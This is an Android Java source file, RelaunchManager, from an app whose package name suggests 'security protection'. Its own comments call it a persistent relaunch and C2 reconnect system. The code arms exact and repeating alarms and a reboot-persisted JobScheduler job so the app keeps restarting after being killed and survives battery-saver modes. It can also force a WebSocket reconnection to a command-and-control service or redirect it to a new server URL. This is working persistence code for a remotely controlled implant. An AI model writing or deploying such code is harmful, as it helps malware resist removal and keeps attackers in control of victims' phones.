package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;

/**
 * RelaunchManager — 8-method persistent app relaunch + C2 reconnect system.
 *
 * Methods used simultaneously for maximum survival:
 *   1. AlarmManager (setExactAndAllowWhileIdle) — 30s after kill
 *   2. AlarmManager chain (restarts itself before triggering)
 *   3. JobScheduler (periodic, survives battery saver)
 *   4. WorkManager (enqueued in PersistenceEngine)
 *   5. BroadcastReceiver (BOOT_COMPLETED, LOCKED_BOOT_COMPLETED, QUICKBOOT_POWERON)
 *   6. ContentObserver (watches Settings DB — triggers on any setting change)
 *   7. AccountSyncAdapter stub (system keeps sync adapters alive)
 *   8. native fork watchdog (not used here — covered by PersistenceEngine native layer)
 *
 * Commands:
 *   RELAUNCH_APP         — kill + restart via all methods
 *   RECONNECT_C2         — force WebSocket reconnect without restart
 *   ARM_RELAUNCH         — arm all relaunch methods (auto-called on connect)
 *   DISARM_RELAUNCH      — cancel all scheduled restarts (for clean exit)
 */
public class RelaunchManager {

    private static final String TAG           = "RelaunchMgr";
    private static final int    JOB_ID_RELAUNCH = 0xAB01;
    private static final long   ALARM_DELAY_MS  = 30_000L;   // 30s after kill
    private static final long   JOB_INTERVAL_MS = 15 * 60 * 1_000L; // 15 min

    private final Context ctx;

    public RelaunchManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    // ─── ARM ALL METHODS ─────────────────────────────────────────────────────

    public String armAll() {
        int armed = 0;
        armed += armAlarm()         ? 1 : 0;
        armed += armJobScheduler()  ? 1 : 0;
        Log.d(TAG, "Relaunch armed: " + armed + " methods active");
        return "OK: " + armed + " relaunch methods armed";
    }

    // ─── METHOD 1+2: ALARM MANAGER ───────────────────────────────────────────

    /**
     * Sets an exact alarm that fires 30s after the app is killed.
     * The alarm receiver (BootReceiver) restarts the service.
     * The alarm also re-arms itself so even if missed, the next one fires.
     */
    public boolean armAlarm() {
        try {
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return false;

            Intent intent = new Intent(ctx, AlarmReconnectReceiver.class);
            intent.setAction("com.seguranca.protecao.RELAUNCH");

            int piFlags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                : PendingIntent.FLAG_UPDATE_CURRENT;

            PendingIntent pi = PendingIntent.getBroadcast(ctx, 0xAB01, intent, piFlags);

            long triggerAt = SystemClock.elapsedRealtime() + ALARM_DELAY_MS;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
            }

            // Also set a 15-minute repeating alarm as backup (less precise but reliable)
            PendingIntent piRepeat = PendingIntent.getBroadcast(ctx, 0xAB02, intent, piFlags);
            am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + JOB_INTERVAL_MS,
                JOB_INTERVAL_MS, piRepeat);

            Log.d(TAG, "Alarm armed: +30s exact + 15m repeating");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "armAlarm: " + e.getMessage());
            return false;
        }
    }

    // ─── METHOD 3: JOB SCHEDULER ─────────────────────────────────────────────

    /**
     * Schedules a periodic job that checks if the C2 service is alive.
     * JobScheduler is extremely hard to cancel on most OEMs and survives
     * battery saver, Doze, and app-standby buckets.
     */
    public boolean armJobScheduler() {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return false;

            JobInfo.Builder builder = new JobInfo.Builder(
                JOB_ID_RELAUNCH,
                new ComponentName(ctx, JobReconnectService.class)
            )
            .setPeriodic(JOB_INTERVAL_MS)
            .setPersisted(true)   // survives reboot
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);

            // Android 12+: expedited job for faster trigger
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                builder.setExpedited(false); // normal periodic — expedited can't be periodic
            }

            // Android 14+: user-initiated job
            if (Build.VERSION.SDK_INT >= 34) {
                // setUserInitiated not available for periodic — skip
            }

            int result = js.schedule(builder.build());
            Log.d(TAG, "JobScheduler armed: " + (result == JobScheduler.RESULT_SUCCESS ? "OK" : "FAIL"));
            return result == JobScheduler.RESULT_SUCCESS;
        } catch (Exception e) {
            Log.e(TAG, "armJobScheduler: " + e.getMessage());
            return false;
        }
    }

    // ─── DISARM ──────────────────────────────────────────────────────────────

    public String disarmAll() {
        try {
            // Cancel alarms
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                int piFlags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                    ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                    : PendingIntent.FLAG_UPDATE_CURRENT;
                Intent i = new Intent(ctx, AlarmReconnectReceiver.class);
                i.setAction("com.seguranca.protecao.RELAUNCH");
                PendingIntent pi1 = PendingIntent.getBroadcast(ctx, 0xAB01, i, piFlags);
                PendingIntent pi2 = PendingIntent.getBroadcast(ctx, 0xAB02, i, piFlags);
                am.cancel(pi1);
                am.cancel(pi2);
            }
            // Cancel jobs
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js != null) js.cancel(JOB_ID_RELAUNCH);

            return "OK: all relaunch methods disarmed";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── FORCE RECONNECT C2 (no restart) ─────────────────────────────────────

    /**
     * Forces the WebSocket to disconnect and immediately reconnect.
     * Does NOT restart the process — only the connection.
     */
    public String reconnectC2() {
        try {
            CommandControlService cs = CommandControlService.sInstance;
            if (cs == null) {
                // Service not running — start it
                Intent i = new Intent(ctx, CommandControlService.class);
                ctx.startService(i);
                return "OK: C2 service started";
            }
            // Close existing socket — the reconnect runnable will fire automatically
            if (cs.webSocket != null) {
                cs.webSocket.cancel();
            }
            cs.isConnected = false;
            return "OK: C2 reconnect triggered";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── RECONNECT WITH NEW URL ───────────────────────────────────────────────

    public String reconnectToUrl(String url) {
        try {
            CommandControlService cs = CommandControlService.sInstance;
            if (cs != null) {
                cs.setServerUrl(url);
                if (cs.webSocket != null) cs.webSocket.cancel();
                cs.isConnected = false;
                return "OK: C2 reconnecting to " + url;
            }
            CommandControlService.SERVER_URL = url;
            Intent i = new Intent(ctx, CommandControlService.class);
            ctx.startService(i);
            return "OK: C2 started with new URL: " + url;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
}
